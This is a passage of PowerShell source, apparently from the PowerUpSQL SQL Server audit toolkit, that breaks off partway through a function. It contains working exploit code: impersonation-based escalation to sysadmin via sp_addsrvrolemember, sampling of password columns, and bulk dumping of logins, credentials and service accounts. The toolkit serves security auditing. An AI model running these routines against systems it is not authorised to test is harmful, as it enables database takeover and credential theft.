        $Description   = 'The current SQL Server login can impersonate other logins.  This may allow an authenticated login to gain additional privileges.'
        $Remediation   = 'Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON Login::sa to [user]. It can be removed using a command like: REVOKE IMPERSONATE ON Login::sa to [user]'
        $Severity      = 'High'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = "Invoke-SQLAuditPrivImpersonateLogin -Instance $Instance -Exploit"
        $Details       = ''
        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms181362.aspx'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # ---------------------------------------------------------------
        # Check for Vulnerability
        # ---------------------------------------------------------------

        # Get list of SQL Server logins that can be impersonated by the current login
        $ImpersonationList = Get-SQLServerPriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.PermissionName -like 'IMPERSONATE'
        }

        # Check if any SQL Server logins can be impersonated
        if($ImpersonationList)
        {
            # Status user
            Write-Verbose -Message "$Instance : - Logins can be impersonated."
            $IsVulnerable = 'Yes'

            # ---------------------------------------------------------------
            # Check if Vulnerability is Exploitable
            # ---------------------------------------------------------------

            # Iterate through each affected login and check if they are a sysadmin
            $ImpersonationList |
            ForEach-Object -Process {
                # Grab grantee and impersonable login
                $ImpersonatedLogin = $_.ObjectName
                $GranteeName = $_.GranteeName

                # Check if impersonable login is a sysadmin
                $ImpLoginSysadminStatus = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$ImpersonatedLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                If($ImpLoginSysadminStatus -eq 1)
                {
                    #Status user
                    Write-Verbose -Message "$Instance : - $GranteeName can impersonate the $ImpersonatedLogin sysadmin login."
                    $IsExploitable = 'Yes'
                    $Details = "$GranteeName can impersonate the $ImpersonatedLogin SYSADMIN login. This test was ran with the $CurrentLogin login."

                    # ---------------------------------------------------------------
                    # Exploit Vulnerability
                    # ---------------------------------------------------------------
                    if($Exploit)
                    {
                        # Status user
                        Write-Verbose -Message "$Instance : - EXPLOITING: Starting exploit process..."

                        # Check if user is already a sysadmin
                        $SysadminPreCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                        if($SysadminPreCheck -ne 1)
                        {
                            # Status user
                            Write-Verbose -Message "$Instance : - EXPLOITING: Verified that the current user ($CurrentLogin) is NOT a sysadmin."
                            Write-Verbose -Message "$Instance : - EXPLOITING: Attempting to add the current user ($CurrentLogin) to the sysadmin role by impersonating $ImpersonatedLogin..."

                            # Attempt to add the current login to sysadmins fixed server role
                            $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXECUTE AS LOGIN = '$ImpersonatedLogin';EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin';Revert" -SuppressVerbose

                            # Verify the login was added successfully
                            $SysadminPostCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                            if($SysadminPostCheck -eq 1)
                            {
                                Write-Verbose -Message "$Instance : - EXPLOITING: It was possible to make the current user ($CurrentLogin) a sysadmin!"
                                $Exploited = 'Yes'
                            }
                            else
                            {
                                Write-Verbose -Message "$Instance : - EXPLOITING: It was not possible to make the current user ($CurrentLogin) a sysadmin."
                            }
                        }
                        else
                        {
                            # Status user
                            Write-Verbose -Message "$Instance : - EXPLOITING: The current login ($CurrentLogin) is already a sysadmin. No privilege escalation needed."
                            $Exploited = 'No'
                        }
                    }
					# ---------------------------------------------------------------
                    # Exploit Nested Impersonation Vulnerability
                    # ---------------------------------------------------------------
                    if($Nested)
                    {
                        # Status user
                        Write-Verbose -Message "$Instance : - EXPLOITING: Starting Nested Impersonation exploit process (under assumption to levels of nesting and 1st first can impersonate sa)..."

                        # Check if user is already a sysadmin
                        $SysadminPreCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                        if($SysadminPreCheck -ne 1)
                        {
                            # Status user
                            Write-Verbose -Message "$Instance : - EXPLOITING: Verified that the current user ($CurrentLogin) is NOT a sysadmin."
                            Write-Verbose -Message "$Instance : - EXPLOITING: Attempting to add the current user ($CurrentLogin) to the sysadmin role..."

                            # Attempt to add the current login to sysadmins fixed server role
                            $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXECUTE AS LOGIN = '$ImpersonatedLogin';EXECUTE AS LOGIN = 'sa';EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin'"

                            # Verify the login was added successfully
                            $SysadminPostCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                            if($SysadminPostCheck -eq 1)
                            {
                                Write-Verbose -Message "$Instance : - EXPLOITING: It was possible to make the current user ($CurrentLogin) a sysadmin!"
                                $Exploited = 'Yes'
                            }
                            else
                            {
                                Write-Verbose -Message "$Instance : - EXPLOITING: It was not possible to make the current user ($CurrentLogin) a sysadmin."
                            }
                        }
                        else
                        {
                            # Status user
                            Write-Verbose -Message "$Instance : - EXPLOITING: The current login ($CurrentLogin) is already a sysadmin. No privilege escalation needed."
                            $Exploited = 'No'
                        }
                    }
                }
                else
                {
                    # Status user
                    Write-Verbose -Message "$Instance : - $GranteeName can impersonate the $ImpersonatedLogin login (not a sysadmin)."
                    $Details = "$GranteeName can impersonate the $ImpersonatedLogin login (not a sysadmin). This test was ran with the $CurrentLogin login."
                    $IsExploitable = 'No'
                }

                # Add record
                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
            }
        }
        else
        {
            # Status user
            Write-Verbose -Message "$Instance : - No logins could be impersonated."
        }

        # Status user
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


Function Invoke-SQLAuditSampleDataByColumn
{
   
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of records to sample.')]
        [int]$SampleSize = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = ' Column name to search for.')]
        [string]$Keyword = 'Password'
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: SEARCH DATA BY COLUMN"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED"
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: SEARCH DATA BY COLUMN"
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS"
        }

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Audit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Potentially Sensitive Columns Found'
        $Description   = 'Columns were found in non default databases that may contain sensitive information.'
        $Remediation   = 'Ensure that all passwords and senstive data are masked, hashed, or encrypted.'
        $Severity      = 'Informational'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = "Invoke-SQLAuditSampleDataByColumn -Instance $Instance -Exploit"
        $Details       = ''
        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms188348.aspx'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------
        Write-Verbose -Message "$Instance : - Searching for column names that match criteria..."
        $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -ColumnNameSearch $Keyword -NoDefaults -SuppressVerbose
        if($Columns)
        {
            $IsVulnerable  = 'Yes'
        }
        else
        {
            $IsVulnerable  = 'No'
        }

        # -----------------------------------------------------------------
        # Check for exploit dependancies
        # Note: Typically secondary configs required for dba/os execution
        # -----------------------------------------------------------------
        if($IsVulnerable -eq 'Yes')
        {
            # List affected columns
            $Columns|
            ForEach-Object -Process {
                $DatabaseName = $_.DatabaseName
                $SchemaName = $_.SchemaName
                $TableName = $_.TableName
                $ColumnName = $_.ColumnName
                $AffectedColumn = "[$DatabaseName].[$SchemaName].[$TableName].[$ColumnName]"
                $AffectedTable = "[$DatabaseName].[$SchemaName].[$TableName]"
                $Query = "USE $DatabaseName; SELECT TOP $SampleSize [$ColumnName] FROM $AffectedTable "

                Write-Verbose -Message "$Instance : - Column match: $AffectedColumn"

                # ------------------------------------------------------------------
                # Exploit Vulnerability
                # Note: Add the current user to sysadmin fixed server role, get data
                # ------------------------------------------------------------------
                if($IsVulnerable -eq 'Yes')
                {
                    $TblTargetColumns |
                    ForEach-Object -Process {
                        # Add sample data
                        Write-Verbose -Message "$Instance : - EXPLOITING: Selecting data sample from column $AffectedColumn."

                        # Query for data
                        $DataSample = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $Query -SuppressVerbose |
                        ConvertTo-Csv -NoTypeInformation |
                        Select-Object -Skip 1
                        if($DataSample)
                        {
                            $Details = "Data sample from $AffectedColumn : $DataSample."
                        }
                        else
                        {
                            $Details = "No data found in affected column: $AffectedColumn."
                        }
                        $IsExploitable = 'Yes'
                        $Exploited = 'Yes'

                        # Add record
                        $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                    }
                }
                else
                {
                    # Add affected column list
                    $Details = "Affected column: $AffectedColumn."
                    $IsExploitable = 'Yes'
                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                }
            }
        }
        else
        {
            Write-Verbose -Message "$Instance : - No columns were found that matched the search."
        }

        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: SEARCH DATA BY COLUMN"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}



Function Invoke-SQLAudit
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [switch]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Folder to write results to csv.')]
        [string]$OutFolder
    )

    Begin
    {

        # If provided, verify write access to target directory
        if($OutFolder){
            if((Test-FolderWriteAccess "$OutFolder") -eq $false){
                Write-Verbose -Message 'No write access.'
                BREAK
            }
        }        

       
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')

        # Table for escalation functions
        $TblVulnFunc = New-Object -TypeName System.Data.DataTable
        $null = $TblVulnFunc.Columns.Add('FunctionName')
        $null = $TblVulnFunc.Columns.Add('Type')
        $TblVulnFunc.Clear()

        Write-Verbose -Message 'Checking.'

        
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditDefaultLoginPw ','Server')   
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditWeakLoginPw','Server')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditPrivImpersonateLogin','Server')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditPrivServerLink','Server')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditPrivTrustworthy','Database')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditPrivDbChaining','Database')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditPrivCreateProcedure','Database')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditPrivXpDirtree','Database')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditPrivXpFileexist','Database')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditRoleDbDdlAdmin','Database')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditRoleDbOwner','Database')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditSampleDataByColumn','Database')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditSQLiSpExecuteAs','Database')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditSQLiSpSigned','Database')
        $null = $TblVulnFunc.Rows.Add('Invoke-SQLAuditPrivAutoExecSp','Database') 
         
        Write-Verbose -Message 'RUNNING VULNERABILITY CHECKS.'
    }

    Process
    {
        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            Return
        }

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Status user
        Write-Verbose -Message "$Instance : Running"

        # Iterate through each function
        $TblVulnFunc |
        ForEach-Object -Process {
            # Get function name
            $FunctionName = $_.FunctionName

            # Run function
            if($Exploit)
            {
                $TblTemp = Invoke-Expression -Command "$FunctionName -Instance '$Instance' -Username '$Username' -Password '$Password' -Exploit"
            }
            else
            {
                $TblTemp = Invoke-Expression -Command "$FunctionName -Instance '$Instance' -Username '$Username' -Password '$Password'"
            }

            # Append function output to results table
            $TblData = $TblData + $TblTemp
        }

        # Status user
        Write-Verbose -Message "$Instance : Finished."
    }

    End
    {
        # Status user
        Write-Verbose -Message 'Finished.'

        # Setup output directory and write results
        if($OutFolder)
        {
            $OutFolderCmd = "echo test > $OutFolder\test.txt"
            $CheckAccess = (Invoke-Expression -Command $OutFolderCmd) 2>&1
            if($CheckAccess -like '*denied.')
            {
                Write-Verbose -Object 'Access denied to output directory.'
                Return
            }
            else
            {
                Write-Verbose -Message 'Verified write access to output directory.'
                $RemoveCmd = "del $OutFolder\test.txt"
                Invoke-Expression -Command $RemoveCmd
                $OutPutInstance = $Instance.Replace('\','-').Replace(',','-')
                $OutPutPath = "$OutFolder\"+'PowerUpSQL_Audit_Results_'+$OutPutInstance+'.csv'
                $OutPutInstance
                $OutPutPath
                $TblData  | Export-Csv -NoTypeInformation $OutPutPath
            }
        }

        # Return full results table
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


Function Invoke-SQLDumpInfo
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Folder to write output to.')]
        [string]$OutFolder,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Write output to xml files.')]
        [switch]$xml,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Write output to csv files.')]
        [switch]$csv
    )

    Begin
    {
        # Setup output directory
        if($OutFolder)
        {
            $OutFolderCmd = "echo test > $OutFolder\test.txt"
        }
        else
        {
            $OutFolder = '.'
            $OutFolderCmd = "echo test > $OutFolder\test.txt"
        }

        # Create output folder
        $CheckAccess = (Invoke-Expression -Command $OutFolderCmd) 2>&1
        if($CheckAccess -like '*denied.')
        {
            Write-Host -Object 'Access denied to output directory.'
            Return
        }
        else
        {
            Write-Verbose -Message 'Verified write access to output directory.'
            $RemoveCmd = "del $OutFolder\test.txt"
            Invoke-Expression -Command $RemoveCmd
        }
    }

    Process
    {
        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            Return
        }

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        Write-Verbose -Message "$Instance - START..."
        $OutPutInstance = $Instance.Replace('\','-').Replace(',','-')

        # Getting Databases
        Write-Verbose -Message "$Instance - Getting non-default databases..."
        $Results = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Databases.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Databases.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting DatabaseUsers
        Write-Verbose -Message "$Instance - Getting database users for databases..."
        $Results = Get-SQLDatabaseUser -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_Users.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_Users.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting DatabasePrivs
        Write-Verbose -Message "$Instance - Getting privileges for databases..."
        $Results = Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_privileges.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_privileges.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting DatabaseRoles
        Write-Verbose -Message "$Instance - Getting database roles..."
        $Results = Get-SQLDatabaseRole -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_roles.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_roles.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting DatabaseRoleMembers
        Write-Verbose -Message "$Instance - Getting database role members..."
        $Results = Get-SQLDatabaseRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_role_members.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_role_members.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting DatabaseTables
        Write-Verbose -Message "$Instance - Getting database schemas..."
        $Results = Get-SQLDatabaseSchema -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_schemas.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_schemas.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting DatabaseTables
        Write-Verbose -Message "$Instance - Getting database tables..."
        $Results = Get-SQLTable -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_tables.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_tables.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting DatabaseViews
        Write-Verbose -Message "$Instance - Getting database views..."
        $Results = Get-SQLView -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_views.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_views.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Database Tables
        Write-Verbose -Message "$Instance - Getting database columns..."
        $Results = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -NoDefaults
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_columns.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_columns.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Server Logins
        Write-Verbose -Message "$Instance - Getting server logins..."
        $Results = Get-SQLServerLogin -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_logins.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_logins.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Server Logins
        Write-Verbose -Message "$Instance - Getting server configuration settings..."
        $Results = Get-SQLServerConfiguration -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_Configuration.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_Configuration.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Server Privs
        Write-Verbose -Message "$Instance - Getting server privileges..."
        $Results = Get-SQLServerPriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_privileges.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_privileges.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Server Roles
        Write-Verbose -Message "$Instance - Getting server roles..."
        $Results = Get-SQLServerRole -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_roles.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_roles.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Server Role Members
        Write-Verbose -Message "$Instance - Getting server role members..."
        $Results = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_rolemembers.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_rolemembers.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Server Links
        Write-Verbose -Message "$Instance - Getting server links..."
        $Results = Get-SQLServerLink -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_links.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_links.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Server Credentials
        Write-Verbose -Message "$Instance - Getting server credentials..."
        $Results = Get-SQLServerCredential -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_credentials.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_credentials.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Service Accounts
        Write-Verbose -Message "$Instance - Getting SQL Server service accounts..."
        $Results = Get-SQLServiceAccount -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Service_accounts.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Service_accounts.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Stored Procedures
        Write-Verbose -Message "$Instance - Getting stored procedures..."
        $Results = Get-SQLStoredProcedure -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_stored_procedure.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_stored_procedure.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting Custom XP Stored Procedures 
        Write-Verbose -Message "$Instance - Getting custom extended stored procedures..."
        $Results = Get-SQLStoredProcedureXP -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_stored_procedure_xp.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Database_stored_procedure_xp.csv'
            $Results | Export-Csv -NoTypeInformation $OutPutPath
        }

        # Getting server policy
        Write-Verbose -Message "$Instance - Getting server policies..."
        $Results = Get-SQLServerPolicy -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        if($xml)
        {
            $OutPutPath = "$OutFolder\$OutPutInstance"+'_Server_policy.xml'
            $Results | Export-Clixml $OutPutPath
        }
        else
        {
